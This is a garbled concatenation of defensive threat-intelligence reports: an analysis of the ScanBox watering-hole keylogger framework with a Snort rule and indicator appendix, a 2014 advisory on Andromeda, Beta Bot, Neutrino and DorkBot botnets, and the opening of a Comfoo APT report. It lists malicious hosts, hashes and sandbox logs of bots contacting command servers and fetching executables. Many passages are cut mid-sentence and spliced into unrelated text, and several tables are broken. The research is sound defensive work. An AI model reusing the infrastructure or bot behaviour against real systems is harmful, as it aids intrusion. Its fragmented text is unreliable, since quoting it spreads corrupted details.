Connecting The Dots After Cyberattack On http://bits.blogs.nytimes.com/2012/08/27/connecting-the-dots-aftercyberattack-on-
Saudi Aramco saudi-aramco/

Virus Shuts Rasgas Office Computers http://www.bloomberg.com/news/2012-08-30/virus-shuts-rasgasoffice-computers-
 lng-output-unaffected-1-.html

Cyber attack takes Qatar's RasGas offline http://www.arabianbusiness.com/cyber-attack-takes-qatar-s-rasgasoffline-471345.Energy professionals will have access
to valuable thought leadership, studies, events and
webcasts, about key industry topics.A regional focus to
the GEI provides decision makers tailored insight within
the Americas, Asia Pacific and the Europe, Middle East
& Africa regions.The GEI strives to arm professionals
with new tools to better navigate the changes in this
dynamic arena.To become a member of the GEI or for
more information please visit kpmg.com/energyaspac
</noncontent>

<noncontent>
<heading>The KPMG Global Energy Conference:</heading>

The KPMG Global Energy Conference (GEC) is KPMG’s
premier event for financial executives in the energy
industry.Presented by the KPMG Global Energy
Institute, these conferences are held in both Houston
and Singapore and bring together energy financial
executives from around the world in a series of
interactive discussions with industry luminaries.The
goal of these conferences is to provide participants
with new insights, tools, and strategies to help them
manage industry-related issues and challenges.For more information please visit kpmg.com/energyaspac


 #KPMGGEC

<heading>Global Power Conference</heading>

The KPMG Global Power & Utilities Conference is
KPMG’s premier event for CEOs, divisional heads and
financial executives of the power and utilities sector
presented by KPMG`s Global Energy and Natural
Resources Practice.The information contained herein is of a general nature and
is not intended to address the circumstances of any particular individual or entity.The information contained herein is of a general nature and is not intended to address the circumstances of any particular individual or entity.Although we endeavour to provide accurate and timely
information, there can be no guarantee that such information is accurate as of the date it is received or that it will continue to be accurate in the future.No one should act upon such information
without appropriate professional advice after a thorough examination of the particular situation.© 2013 KPMG International Cooperative (“KPMG International”), a Swiss entity.Member firms of the KPMG network of independent firms are affiliated with KPMG International.KPMG International
provides no client services.No member firm has any authority to obligate or bind KPMG International or any other member firm vis-à-vis third parties, nor does KPMG International have any such
authority to obligate or bind any member firm.All rights reserved.</noncontent>
</doc><doc>
<section>
<heading>
ScanBox framework – who’s affected, and who’s using it?</heading>
By Chris Doman and Tom Lancaster

Earlier this year the Japanese language website of one of the world’s largest suppliers of industrial
equipment was compromised by a sophisticated threat actor.Usually in such cases an attacker will use
their access to place an exploit kit on the compromised website, delivering malware to visitors - a
technique commonly referred to as setting up a ‘watering hole’ or ‘strategic web compromise’.In this case
however, rather than relying on malware, the exploit kit was a self-contained key logger that recorded all
keystrokes the user performed while on the website.AlienVault[1] produced an excellent write-up on this
framework, which the developers named ScanBox.ScanBox is particularly dangerous as it doesn't require malware to be successfully deployed to disk in
order to steal information - the keylogging functionality simply requires the JavaScript code to be
executed by a web browser.The framework also facilitates reconnaissance, enabling attackers to exploit
vulnerabilities in visitors systems in a more traditional fashion, by pushing & executing malware.Since the initial post made by AlienVault, we have been actively scouring the web for new instances of the
framework.In this blog, we’re going to discuss four other watering holes which use ScanBox:
<table>
 Month Identified       Country           Sector / type         ScanBox domain
 August 2014            JP                Industrial sector     js.webmailgoogle[.]com
 September 2014         CN                Uyghur                code.googlecaches[.]com
 October 2014           US                Think tank            news.foundationssl[.]com
 October 2014           KR                Hospitality           qoog1e[.]com
</table>
Table 1 – Selected ScanBox compromises

Looking at who was being targeted, we noticed a reasonable variation, including targeting of the Uyghur
population in China, US Think Tanks, the Japanese Industrial sector & Korean hospitality.This variation
was our first clue that more than one actor may be using the framework (although on its own this would
not be enough - some actors do target a wide range of organisations, some also focus on specific
geographies or sectors).To check if this was the case, we took a deeper dive into each version of the code.</section>
<section>
The Framework

Whilst all four implementations share the same codebase, there are some minor differences in their
implementations.These differences may show that different attackers are using the ScanBox framework.We’ve outlined a few key differences we identified below:

Malicious code was delivered in a single block of JavaScript on both webmailgoogle[.]com and
foundationssl[.]com.The domains qoog1e[.]com and googlecaches[.]com selectively loaded extra plugins
from separate files:


<figure></figure>

Figure 1 – The JavaScript function to load additional plugins

We can see how these differ by comparing two exploit kits side by side:


<figure></figure>

Figure 2 – foundationssl[.]com on the left loads JavaScript inline.qoog1e.com on the right loads
JavaScript from separate files
A motivation for selectively loading plugins is likely to be to prevent crashes or any errors appearing
(which may alert the compromised site’s owner) when the page is loaded – as some of the plugins are only
compatible with specific browsers.Selectively loading plugins has the added bonus of slightly reducing
access to the attacker’s code to researchers.Browsers the attackers are not interested in will be served the
following placeholder instead of the malicious function:

<figure></figure>


Figure 3 – The empty JavaScript function that the exploit kit delivers when a browser doesn’t match a
targeted browser

The following ScanBox plugins are deployed on code.googlecaches[.There are further code differences too.Take for example the different implementations of software
enumeration, by identifying whether certain files exist:
<figure></figure>
Figure 4 – Software enumeration on googlecaches[.]com (left) and foundationssl[.]com (right)

From a developer’s perspective, I know it’s always a good idea to check the details of any exceptions that
occur when writing code in order to create more stable applications.It’s pleasing to see the ScanBox
developers using good coding practices, though only if they’re in the office!<figure></figure>

Figure 5 – Highlighted section of code from Figure 3 (Plugin 1 on code.googlecaches[.]com)

When identifying the security software, only the implementation found on foundationssl[.]com employs
the full version of some publicly available code[5] (the section of code with informational messages such
as “"Folder was found!"”).In all other versions only a subsection of the same code is used.At this point we’ve established that there are subtle variations between the ScanBox code deployed on
different websites, however this could be due to differences in the expected environment of the targets the
attackers wish to infect in each case, or upgrades to the framework.</section>
<section>
Analysis of associated attacker infrastructure
In order to potentially group the activity observed together, we analysed network infrastructure associated
with the domains used by the attacker(s) deploying the ScanBox framework.Our analysis showed that
there was little overlap both in terms of associated infrastructure and in terms of the malware families
associated with that infrastructure.Summaries of each cluster are given below, whilst full details of the components which made up each are
available in the Appendix.<table>
 Cluster      Starting point           Malware         Domain Registrars          Nameservers used
                                       families        used
 1            *.googlecaches[.]com     Briba, Zegost   PublicDomainRegistry.com   *.cloudns.net
 2            *.foundationssl[.]com    Unknown         GoDaddy                    *.cloudflare.com
 3            *.qoog1e[.]com           Unknown         HiChina                    *.hichina.com
 4            *.webmailgoogle[.]com    Jolob           GoDaddy                    *.domaincontrol.com

</table>


We have been unable to identify any direct overlaps between the clusters, i.e.shared domains or IP
addresses, neither have we been able to determine any softer linkages beyond the reuse of the GoDaddy
registrar.Of course this could be due to lack of data points available to us – we welcome any additional data points
the community are available to provide which show linkages between the clusters shown below.Visualisations of each cluster can be seen in the Maltego graphs below:

Cluster 1
<figure></figure>
Cluster 2
<figure></figure>
Cluster 3
<figure></figure>
Cluster 4
<figure></figure>
Conclusions


In this post we’ve identified four affected websites, each of which would draw distinct audiences who
would be valuable to different actors.We’ve also taken a look at the variations in how the framework was
implemented, and found a few subtle differences in the implementations.Finally, we analysed the
associated infrastructure with the attacker domains used in each case, and found no overlap between the
clusters of activity.In a similar fashion to our previous blog entry on potential overlap between APT1 and Putter Panda[6] ,
we can attempt to explain these differences with several hypotheses:

   1.The framework is used by a single group that target widely and upgrade or adapt their code for
      different targets, and are careful to avoid any overlap in infrastructure or in services used.2.Selections of actors share some resources, as per previous observations with similar kits by some
      security vendors[7].3.The exploit kits have been used by one group, and taken from public watering holes for their own
      use by other unrelated persons

In our experience, very few attackers have the patience to maintain completely distinct infrastructure with
multiple registrars, name servers and hosting providers at the same time, therefore we have a low
confidence in hypothesis 1.In our view, the hypothesis with the highest probability is that groups of
attackers share resources leading to overlaps – this appears to be an ever more common feature – with
malware families, builders, and even sometimes hosting infrastructure being shared between disparate
actors with a common goal.Sharing frameworks like ScanBox or other exploit kits allows less
sophisticated actors (who were themselves unable to develop a tool like ScanBox) to conduct better
attacks.</section>
<section>
Appendix - Snort Rules
<list>
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"ScanBox Framework Plugin used in
WateringHole Attacks"; flow:from_server,established; file_data; content:"=scanbox.info.]246                  IP Address
 Cluster 1                        103.255.61[.]114                   IP Address
 Cluster 1                        103.255.61[.]39                    IP Address
 Cluster 1                        118.193.153[.]201                  IP Address
 Cluster 1                        123.108.111[.]209                  IP Address
 Cluster 1                        176.53.22[.]143                    IP Address
 Cluster 1                        184.22.163[.]121                   IP Address
 Cluster 1                        184.82.123[.]222                   IP Address
 Cluster 1                        184.82.46[.]5                      IP Address
 Cluster 1                        210.0.176[.]21                     IP Address
 Cluster 1                        210.0.176[.]23                     IP Address
 Cluster 1                        210.209.127[.]114                  IP Address
 Cluster 1                        210.209.127[.]32                   IP Address
 Cluster 1                        210.209.127[.]39                   IP Address
 Cluster 1                        210.209.127[.]53                   IP Address
 Cluster 1                        409ae279d7c44b11156318848ddb4a3f   MD5
 Cluster 1                        9cf5523da799277a4d40881199eb8325   MD5
 Cluster 1                        66.197.231[.]62                    IP Address
 Cluster 1                        69.197.146[.]80                    IP Address
 Cluster 1                        69.197.183[.]142                   IP Address
 Cluster 1                        69.197.183[.]152                   IP Address
 Cluster 1                        69.197.183[.]159                   IP Address
 Cluster 1                        69.197.183[.]189                   IP Address
 Cluster 1                        9D1F8822B92AD3224DB1C9EC89B529CA   MD5
 Cluster 1                        blog.msdnblog[.]com                Hostname
 Cluster 1                        blogs.msdnblog[.]com               Hostname
 Cluster 1                        ccac.dyndns-web[.]com              Hostname
 Cluster 1                        code.googlecaches[.]com            Hostname
 Cluster 1                        dns.symantec-sync[.]com            Hostname
 Cluster 1                        download.msdnblog[.]com            Hostname
 Cluster 1                        download.symantec-sync[.]com       Hostname
Cluster 1   ef498ea09bf51b002fc7eb3dfd0d19d3     MD5
Cluster 1   googlebot1.dyndns-office[.]com       Hostname
Cluster 1   googlebot5.dyndns-office[.]com       Hostname
Cluster 1   Googlecaches[.]com                   Hostname
Cluster 1   Googlewebcache[.]com                 Hostname
Cluster 1   image.googlecaches[.]com             Hostname
Cluster 1   image.symantec-sync[.]com            Hostname
Cluster 1   images.googlewebcache[.]com          Hostname
Cluster 1   james_boodle@yahoo[.]com             Domain registration
                                                 address
Cluster 1   lenovocn.dyndns[.]org                Hostname
Cluster 1   Lifewalden[.]com                     Hostname
Cluster 1   Msdnblog[.]com                       Hostname
Cluster 1   news.googlecaches[.]com              Hostname
Cluster 1   news.msdnblog[.]com                  Hostname
Cluster 1   Outlookssl[.]com                     Hostname
Cluster 1   remote.googlewebcache[.]com          Hostname
Cluster 1   shared.images.googlewebcache[.]com   Hostname
Cluster 1   smtp.outlookssl[.]com                Hostname
Cluster 1   smtp.windowsautoupdate[.]com         Hostname
Cluster 1   some.trouble@yahoo[.]com             Domain registration
                                                 address
Cluster 1   symantec-sync[.]com                  Hostname
Cluster 1   tem.dyndns[.]tv                      Hostname
Cluster 1   test.googlecaches[.]com              Hostname
Cluster 1   update.windowsautoupdate[.]com       Hostname
Cluster 1   upload.msdnblog[.]com                Hostname
Cluster 1   web.windowsautoupdate[.]com          Hostname
Cluster 1   Windowsautoupdate[.]com              Hostname
Cluster 1   www.msdnblog[.]com                   Hostname
Cluster 1   www.windowsautoupdate[.]com          Hostname
Cluster 1   xingyadi2008@gmail[.]com             Domain registration
                                                 address
Cluster 1   zhfdc.dyndns[.]org                   Hostname
Cluster 2   180.210.206[.]225                    IP Address
Cluster 2   192.161.61[.]10                      IP Address
Cluster 2   198.96.92[.]108                      IP Address
Cluster 2   204.152.198[.]100                    IP Address
Cluster 2   210.209.86[.]145                     IP Address
Cluster 2   9aaa[.]info                          Hostname
Cluster 2   Educational[.]com                  Hostname
Cluster 2   flash0day.4pu[.]com                Hostname
Cluster 2   flashplayer.proxydns[.]com         Hostname
Cluster 2   Foundationssl[.]com                Hostname
Cluster 2   Hudsononlinenews[.]com             Hostname
Cluster 2   li2384826402@yahoo[.]com           Domain registration
                                               address
Cluster 2   news.educationel[.]com             Hostname
Cluster 2   news.foundationssl[.]com           Hostname
Cluster 2   proxy.otzo[.]com                   Hostname
Cluster 2   qinyz001@163[.]com                 Domain registration
                                               address
Cluster 2   socks5.proxydns[.]com              Hostname
Cluster 2   vpn.foundationssl[.]com            Hostname
Cluster 2   vpn.ssl443[.]org                   Hostname
Cluster 2   wangsongxu@gmail[.]com             Domain registration
                                               address
Cluster 2   www.educationel[.]com              Hostname
Cluster 2   www.foundationssl[.]com            Hostname
Cluster 2   www.hudsononlinenews[.]com         Hostname
Cluster 3   58.96.172[.]209                    IP Address
Cluster 3   qoog1e[.]com                       Hostname
Cluster 3   www.qoog1e[.]com                   Hostname
Cluster 3   yuming@yinsibaohu.aliyun[.]com     Domain registration
                                               address
Cluster 4   113.10.201[.]124                   IP Address
Cluster 4   122.10.10[.]210                    IP Address
Cluster 4   122.10.9[.]109                     IP Address
Cluster 4   blog.mailaunch[.]com               Hostname
Cluster 4   boxun.mailaunch[.]com              Hostname
Cluster 4   email.webmailgoogle[.]com          Hostname
Cluster 4   be3a3daa7d0d11df2380d3401696624a   MD5
Cluster 4   files.mailaunch[.]com              Hostname
Cluster 4   ftp.webmailgoogle[.]com            Hostname
Cluster 4   imap.mailaunch[.]com               Hostname
Cluster 4   inbox.mailaunch[.]com              Hostname
Cluster 4   inbox.webmailgoogle[.]com          Hostname
Cluster 4   js.webmailgoogle[.]com             Hostname
Cluster 4   mail.webmailgoogle[.]com           Hostname
Cluster 4   Mailaunch[.]com                    Hostname
Cluster 4   networkedu@hotmail[.]com           Domain registration
                                                                             address
 Cluster 4                       news.mailaunch[.]com                        Hostname
 Cluster 4                       pop.mailaunch[.]com                         Hostname
 Cluster 4                       smtp.mailaunch[.]com                        Hostname
 Cluster 4                       Webmailgoogle[.]com                         Hostname
 Cluster 4                       www.mailaunch[.]com                         Hostname
 Cluster 4                       www.webmailgoogle[.]com                     Hostname
 Cluster 4                       yahoo.mailaunch[.[4] This is the key logger described by AlienVault, and using code previously published on sites such as
CSDN

[5] http://sc.mac.gd/vuldb/ssvid-60783

[6] http://pwc.blogs.com/cyber_security_updates/2014/07/apt1-putter-panda-collaboration-or-a-
shared-contractor.html

[7] www.symantec.com/connect/blogs/how-elderwood-platform-fueling-2014-s-zero-day-attacks

</footnote>
</section>
</doc>While that customer was protected, we at General Dynamics Fidelis Cybersecurity Solutions
decided to take a closer look.The analysis of the malicious code revealed that it appeared to be
Andromeda but the delivery infrastructure looked interesting.Further telemetry from our sensors showed
that this server in China was also hosting and distributing many other malicious specimens.Analysis of
the data revealed a pattern in the filenames.Our analysts used this pattern to discover other systems
distributed across the globe serving up various botnet malware, so far assumed to be used in distinct
campaigns but clearly related in this case:

     -     Andromeda
     -     Beta Bot
     -     Neutrino Bot
     -     NgrBot/DorkBot

Analysis also showed how attackers continue to benefit from the use of globally-distributed hosting
providers to perform their malicious activities.Further, the analysis revealed how attackers are hosting
and distributing identical copies of the malware from servers in different countries including China,
Poland, Russia, and the United States.For the period of time researched in this activity, we observed the following targeted sectors in the US:

     -     Manufacturing / Biotechnology & Drugs
     -     Professional Services / Engineering
     -     Information Technology / Telecommunications
     -     Government / State

Note that our footprint is largely in the Enterprise space and it is possible that we’re seeing spillover from
wider campaigns.This document uncovers various servers hosting Bots and other related malware, provides a triage
analysis of various pieces of malware hosted by these malicious servers, and provides indicators that
network defenders can use to protect their networks.</section>

<noncontent>Users are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use.This document
cannot be modified or converted to any other electronic or machine-readable form in whole or in part without prior written approval of Fidelis Security
Systems, Inc.While we have done our best to ensure that the material found in this document is accurate, Fidelis Security Systems, Inc. makes no guarantee that
the information contained herein is error free.Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                                                   Rev.As it is known by the network defenders and the security community, it is important to defend against
these attacks since systems infected with these malicious specimens could be used for credential theft,
Distributed Denial of Service Attacks, spreading malware, lateral propagation, etc.This is of great concern
as the first stage attack continues to bypass network security defenses infecting user’s computers that
beacon to malicious servers to download or create the second stage malware into the victim systems.Some of the main Bot types of malware detected through this research include:
    -­‐   Andromeda
          Andromeda is a modular bot that downloads modules and updates from its command and control
          (C&C) server during execution.The malware has both anti-VM and anti-reversing features.Its
          code is obfuscated to make it more difficult for malware reverse engineers to analyze and
          antivirus tools to detect.Andromeda bot features include: self-propagation, injection into trusted processes to hide itself,
          network traffic encryption, download and installation of files/malware, form grabber, keylogger,
          ring3 rootkit, proxy, etc.Features like form grabber, rootkit, and proxy are delivered to the
          malware in the form of modules that are then loaded into the victim system after the malware
          makes a connection with its C&C.It appears that in 2012, some of the modules were sold for
          $500 (form grabber), $300 (Ring3 rootkit), and $200 (keylogger).-­‐   DorkBot/NgrBot
          DorkBot is a modified IRCBot that is very similar in features to NgrBot.DorkBot has a loader and
          a module.The bot includes the following features: process injection, hard drive wiping, etc.Different from NgrBot, DorkBot uses modified IRC commands.Some of the commands supported
          include: !die, !dl, !http.inj, !logins, !rc,!speed, !ssyn, !stop, !up, and !udp.NgrBot can also be remotely controlled via Internet-Relay-Chat (IRC) protocol.It has capabilities
          to join different IRC channels to perform various attacks according to the IRC-based commands
          from the C&C server.Its code is obfuscated to make it more difficult for malware reverse
          engineers to analyze and antivirus tools to detect.NgrBot features include: self-propagation (e.g.through USB removable drives, social networking
          sites, and messaging clients), process injection, hard drive wiping, blocking access to multiple
          antivirus/security vendor websites, denial of service attacks, credentials stealing (usernames and
          passwords), download and execute file, etc.Some of the commands supported are: ~pu, ~dw,
          ~http.inj, ~logins, ~rc, ~speed, ~ssyn, ~stop, and ~udp.-­‐   Beta Bot
          It is said that Beta bot started out as an HTTP bot.The Bot is also known by some security
          vendors as ‘Trojan.Neurevt’.Its code is obfuscated to make it more difficult for malware reverse
          engineers to analyze and antivirus tools to detect.Beta bot features include: anti-VM and anti-reversing, self-propagation, rootkit, process injection,
          blocking access to multiple antivirus/security vendor websites, AV-disabling, form grabbing,
          download and execution of files, termination of competing malware communications by
          terminating their processes or blocking their code injections, and denial of service.It appears that


<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                     Rev.According to online research, Beta Bot sales are being
          handled by “Lord Huron,” although “betamonkey” appears to be the author.The following image
          was found during online research:

<figure></figure>


    -­‐   Neutrino
          The Neutrino bot was advertised as an HTTP stress-testing tool.It has some of the following
          features: anti-VM and anti-reversing/debugging, denial of service (HTTP/TCP/UDP flood),
          keylogger, command shell, credential stealing, self-spreading, etc.It appears at some point the
          bot was sold for $550 (Builder), $200 (Full set including Bot and Admin Panel), and $20 (Update).Online research revealed the following contact information for this bot: n3utrino@kaddafi[.]me /
          n3utrino@xmpp[.]jp / n3utrino.blog[.]com.The following images were found during online
          research:


<figure></figure>

<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                   Rev.]241	
      Russia	
   and[2_digits].exe	
  
                                                                     ng[2_digits]exe	
  
                                                                     nut[2_digits][single	
  character][2_digits].exe	
  
                                                                     nut[2_digits].exe	
  
                                                                     	
  
        October	
  2014	
          54.191.142[.]7	
              China	
       Worm.Win32.Ngrbot	
                Professional	
  Services/Engineering	
  
                                             Worm.Win32.Dorkbot	
  

<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                                      Rev.]45	
     Poland	
   Backdoor.Win32.Androm	
           	
  
                                    Trojan.Win32.Lethic	
  
                                    Trojan.Win32.Inject	
  
                                    Trojan.Win32.Munchies	
  
                                    Trojan.Win32.Yakes	
  
  54.69.90[.]62	
         US	
      Backdoor.Win32.Androm	
          	
  
                       (Amazon)	
   Worm.Win32.Ngrbot	
  
                                    Worm.Win32.Dorkbot	
  
                                    Backdoor.Win32.Ruskill	
  
                                    Trojan.Win32.Lethic	
  
                                    Trojan.Win32.Yakes	
  
                                    Trojan.Win32.Munchies	
  
                                    	
  
  117.21.191[.]44	
     Poland	
   Backdoor.Win32.Androm	
           	
  
                                    Worm.Win32.Ngrbot	
  
                                    Trojan.Win32.Badur	
  
                                    Trojan.Win32.Yakes	
  
                                    	
  
  54.68.121[.]73	
        US	
      Backdoor.Win32.Androm	
          Government	
  
                       (Amazon)	
   Trojan.Proxy.Win32.Lethic	
  
                                    Worm.Win32.Ngrbot	
  

<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                          Rev.]44	
           China	
  
                                      Backdoor.Win32.Androm	
                	
  
                                      Worm.Win32.Ngrbot	
  
                                      Backdoor.Win32.Ruskill	
  
                                      Trojan.Win32.Badur	
  
                                      Trojan.Win32.Yakes	
  
                                      	
  
    158.255.1[.]241	
      Russia	
   Backdoor.Win32.Androm	
                Government	
  
                                      Worm.Win32.Ngrbot	
  
                                      Trojan.Win32.Badur	
  
                                      Trojan.Win32.Yakes	
  
                                      	
  
    54.191.142[.They also have features to spread themselves through USB removable drives, social networking
sites, and messaging clients.In addition, they could also infiltrate the network when the victim user visits
a website hosting a browser exploit.Once the attacker gains control, the infected system could be used to launch Distributed Denial of Service
attacks, spread the bot to other victims, download more advanced malware to perform lateral
propagation, etc.The attackers (Bot Masters/Herders) could also rent their botnets to other
cybercriminals.</section>

<header>Indicators and Mitigation Strategies</header>
<section>
This section presents information about some of the servers we have observed hosting and distributing
malware, filename patterns, as well as a triage analysis of various pieces of malware observed delivered
by these servers

-          Servers observed hosting and distributing malware:
<table>
                121.11.83[.]7	
            121.14.212[.]184	
          119.1.109[.]44	
            117.21.191[.]47	
  
               155.133.18[.]44	
           155.133.18[.]45	
           158.255.1[.]241	
           217.23.6[.]112	
  
               54.191.142[.]124	
           54.68.121[.]73	
           54.68.194[.]154	
            54.69.90[.]62	
  


<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                                   Rev.]128	
                       	
                              	
</table>          	
  


-   Some of the filename patterns observed:
<table>
          121.11.83[.]7/and40a70.exe	
          121.11.83[.]7/bet40a71.exe	
              121.11.83[.]7/ng40a71.exe	
  
          155.133.18[.]45/37a1.exe	
            54.69.90[.]62/330740a71.exe	
             54.69.90[.]62/bnew40a71.exe	
  
          155.133.18[.]45/109a7.exe	
           155.133.18[.]45/51a5.exe	
                155.133.18[.]45/62.exe	
  
          121.14.212[.]184/ng33.exe	
           121.14.212[.]184/zpm39a.exe	
             155.133.18[.]45/141a1.exe	
  
          217.23.6[.]112/98.exe	
               54.191.142[.]124/zpm37.exe	
              54.69.90[.]62/bnew40a85.exe	
  
          121.11.83[.]7/nut40a71.exe	
          54.69.90[.]62/dqnew40a81.exe	
            119.1.109[.]44/and33.exe	
  
          217.23.6[.]112/330740x.exe	
          77.87.79[.]128/37extra.exe	
              158.255.1[.119.1.109[.]44/and37.exe (China)
                   2.121.14.212[.]184/and37.exe (China)
                   3.54.68.121[.This malware is believed to be a variant
                   from the ‘Andromeda Bot’ malware family.When the file was executed in a Windows 7 system, the following activity was observed:

                   Domain:                                a2kiaymoster14902[.]com
                   Resolved IP:                           121.14.212[.]248 (China)
                   POST request:                          /bla02/gate.php
                   GET request:                           54.69.90[.]62/and40a90.exe (US)
                   File downloaded:                       b62391f3f7cbdea02763614f60f3930f (msitygyd.exe)
                   Full path and name:                    C:\ProgramData\msitygyd.exe
                   Process injection:                     C:\Windows\SysWOW64\msiexec.exe


<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                                       Rev.117.21.191.47/betw9.exe (China)
                   2.This malware is believed to be a variant from the ‘Beta Bot’
                   malware family.When the file was executed in a Windows XP system, the following activity was
                   observed:

                   Domain:                     b.9thegamejuststarted14k9[.]com
                   Resolved IP:                116.255.202[.]74 (China)
                   POST request:               /direct/mail/order.php?id=9156969
                   GET request:                121.14.212[.]184/ng40a54.exe (China)
                   File downloaded:            fe8c978f05f3a83af7c8905f94f71213 (mxbrwtqjjvk.exe)
                   Full path and name:         %TEMP%\mxbrwtqjjvk.exe

                   GET request:                121.14.212[.121.14.212[.]184/nut40a52.exe (China)
                   2.155.133.18[.In a bare-metal system, the malware worked properly.This
                   malware is believed to be a variant from the ‘Neutrino Bot’ malware family.When the file was executed in a Windows 7 system, the following activity was observed:

                   Domain:                       nutqlfkq123a10[.]com
                   Resolved IP:                  121.61.118[.]140 (China)
                   POST request:                 /newfiz3/tasks.php
                          Data:                  ping=1


<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                       Rev.117.21.191[.]47/and40a37.exe (China)
                   2.54.68.121[.In a bare-metal system, the malware worked properly.This
                   malware is believed to be a variant from the ‘Andromeda Bot’ malware family.When the file was executed in a Windows 7 system, the following activity was observed:

                   Domain:                       a2kiaymoster14902[.]com
                   Resolved IP:                  121.14.212[.The hidden “WinDefend” service points
                   to the following DLL: “C:\Program Files (x86)\Windows Defender\mpsvc.dll”.The system
                   was found to have a valid “mpsvc.dll” file under the “C:\Program Files\Windows
                   Defender\” directory.The following screenshot show GMER detecting the hidden service:

<figure></figure>


         The following is a summary of all the domains and IPs observed during the analysis of the
         selected malware:

              o    a2kiaymoster14902[.]com - 121.14.212[.]248 (China)


<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                       Rev.]62/and40a90.exe (US)
              o    b.9thegamejuststarted14k9[.]com - 116.255.202[.]74 (China)
              o    121.14.212[.]184/ng40a54.exe / 121.14.212[.]184/and40a54.exe (China)
              o    nutqlfkq123a10[.]com - 121.61.118[.It illustrates the relationship between some of the malicious servers, locations,
malware hosted/distributed, and malicious servers to which the malware beacons to with POST requests
and to download additional malware:


<figure></figure>
</section>

<header>The Fidelis Take</header>
<section>This paper highlights campaigns that has compromised systems at significant enterprises worldwide,
utilizing various bot malware.We are publishing these indicators so others in the security research
community can monitor for this activity and potentially correlate against other campaigns and tools that
are being investigated.General Dynamics Fidelis’ advanced threat defense product, Fidelis XPS™, detects all of the activity
documented in this paper.Further, we will continue to follow this specific activity and actively monitor the
ever-evolving threat landscape for the latest threats to our customers’ security.</section>




<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                    Rev.Neutrino Bot (aka MS:Win32/Kasidet), June 2014:
   http://malware.dontneedcoffee.com/2014/06/neutrino-bot-aka-kasidet.html

2.Renting a Zombie Farm: Botnets and the Hacker Economy, August 2014:
   http://www.symantec.com/connect/blogs/renting-zombie-farm-botnets-and-hacker-economy

3.DorkBot, a Twin Botnet of NgrBot, August 2014: http://blog.fortinet.com/post/dorkbot-a-twin-botnet-of-
   ngrbot

4.Big Box LatAm Hack (1st part - Betabot), January 2014:
   http://securelist.com/blog/research/58213/big-box-latam-hack-1st-part-betabot/

5.A Good Look at the Andromeda Botnet, April 2014: https://blog.fortinet.com/post/a-good-look-at-the-
   andromeda-botnet

6.CVE-2013-2729 and Andromeda 2.9 - A Massive HSBC themed email campaign, June 2014:
   http://stopmalvertising.com/spam-scams/cve-2013-2729-and-andromeda-2.9-a-massive-hsbc-
   themed-email-campaign/andromeda-botnet.html

7.Beta Bot – A Code Review, November 2013: http://www.arbornetworks.com/asert/2013/11/beta-bot-
   a-code-review/

8.Athena, A DDoS Malware Odyssey, Nov 2013: http://www.arbornetworks.com/asert/2013/11/athena-
   a-ddos-malware-odyssey/

9.Andromeda Botnet Gets an Update, July 2013: http://blog.trendmicro.com/trendlabs-security-
   intelligence/andromeda-botnet-gets-an-update/

10.New Commercial Trojan #INTH3WILD: Meet Beta Bot, May 2013: https://blogs.rsa.com/new-
    commercial-trojan-inth3wild-meet-beta-bot/

11.A new bot on the market: Beta Bot, May 2013: https://blog.gdatasoftware.com/blog/article/a-new-bot-
    on-the-market-beta-bot.html

12.Andromeda Botnet Resurfaces, March 2013: http://blog.trendmicro.com/trendlabs-security-
    intelligence/andromeda-botnet-resurfaces/

13.Fooled by Andromeda, March 2013: http://www.0xebfe.net/blog/2013/03/30/fooled-by-andromeda/

14.Botnets Die Hard - Owned and Operated – Defcon 20: July 2012:
    https://www.defcon.org/images/defcon-20/dc-20-presentations/Sood-Enbody/DEFCON-20-Sood-
    Enbody-Botnets-Die-Hard.PDF.pdf

15.A Chat With NGR Bot, June 2012: http://resources.infosecinstitute.com/ngr-rootkit/

16.Analysis of ngrBot, August 2011: http://stopmalvertising.com/rootkits/analysis-of-ngrbot.html

</section>


<noncontent>Copyright © 2014 General Dynamics Fidelis Cybersecurity Solutions                  Rev.1.1 2014-12-12
Threat Advisory #1014                            Page 16 of 16          Bots, Machines, and the Matrix
</noncontent>
</doc><doc>
<section>
<heading>
Secrets of the Comfoo Masters</heading>
     Author: Joe Stewart and Don Jackson, Dell SecureWorks Counter Threat Unit(TM)
     Threat Intelligence
     Date: 31 July 2013
     URL:http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-of-
     the-comfoo-masters/
<heading>
Introduction
</heading>
The details of organized cyber-espionage campaigns are becoming more public.So-
called "Advanced Persistent Threat" (APT) attacks are common news as individuals and
corporations discover the data on their hard drives is part of a country or competitor's
"shopping list."The actors behind these attacks are generally well-equipped in terms of
training, finances, and access to resources.The missions of APT threat actors are usually
of strategic importance, and the actors exercise virtually unlimited patience in penetrat-
ing and persisting inside their specific target's network until they accomplish their
goals.One of the universal aspects of APT attacks is the use of malicious software tools that
grant unauthorized backdoor access to computer systems inside the targeted network.Because maintaining a beachhead inside the network is often critical to mission success,
threat actors must adapt to various network configurations and changes in defenses by
choosing and deploying backdoors with specific functionality and features.It is difficult
to be persistent without at least one backdoor.Threat actors often possess and use an ar-
senal of remote access trojans (RATs) to siphon data from their targets.Persistence re-
quires malware, and the top cyber-espionage actors have hundreds of RATs at their dis-
posal at any given time.Understanding the choice and usage of tools can be the keys to
identifying and tracking APTs.Dell SecureWorks researchers have identified and classified more than 200 distinct mal-
ware families used by various APT groups.Some malware is specially configured off-
the-shelf software, and some malware is customized source code of an existing RAT.However, most malware families are proprietary, developed by the APT groups as
weapons to be deployed against a variety of targets.Accurate identification and classifi-
cation of this malware by antivirus (AV) companies is sparse.Shared code, the use of
common tools, co-infections, and a history of generic or incorrect classification by multi-
ple names make the automated tracking of these tools by AV companies difficult.This
inaccuracy can be detrimental when designing defenses based on specific threat indica-
tors.Tracking APTs requires a dedicated malware intelligence effort.One way applied
malware intelligence is used to discover new APT trojans is a recursive investigative
